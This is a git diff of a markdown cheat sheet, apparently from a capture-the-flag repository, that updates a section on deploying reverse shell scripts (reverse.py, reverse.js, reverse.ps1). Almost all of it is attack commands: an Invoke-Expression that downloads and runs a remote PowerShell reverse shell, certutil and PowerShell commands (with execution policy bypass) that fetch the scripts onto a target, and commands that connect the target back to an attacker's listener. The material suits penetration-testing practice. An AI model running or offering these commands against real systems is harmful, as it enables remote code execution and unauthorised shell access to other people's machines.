@@ -640,42 +640,43 @@ $env:port=<listener port>
 Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
 ```
 
-### 4.6. Using the [reverse.py](/reverse.py) script in this repo
+### 4.6. Using the [reverse.py](/reverse.py) or [reverse.js](/reverse.js) script in this repo
 
-Python is mostly pre-installed on Linux, install Python on Windows from https://apps.microsoft.com/detail/9pnrbtzxmb4z?hl=en-US&gl=SG
+Installing Python and Node.js
+
+```sh
+apt -y install python3 nodejs
+```
+
+```cmd
+winget install python OpenJS.NodeJS
+```
 
 #### Download to kali
 
 ```sh
-curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/reverse.py
+curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/<reverse.py/js>
 ```
 
 #### Download on target directly
 
 ```cmd
-certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py
+certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js>
 ```
 
 ```cmd
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py -OutFile .\reverse.py
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js> -OutFile .\<reverse.py/js>
 ```
 
 ```cmd
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py','.\reverse.py')
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js>','.\<reverse.py/js>')
 ```
 
 #### Run the script
 
-Linux:
-
 ```sh
-python3 reverse.py <listener address> <listener port>
-```
-
-Windows:
-
-```pwsh
-%PROGRAMFILES%\Python314\python.exe reverse.py <listener address> <listener port>
+python3 reverse.py <listener_address> <listener_port>
+node reverse.js <listener_address> <listener_port>
 ```
 
 ### 4.7. Windows direct connection
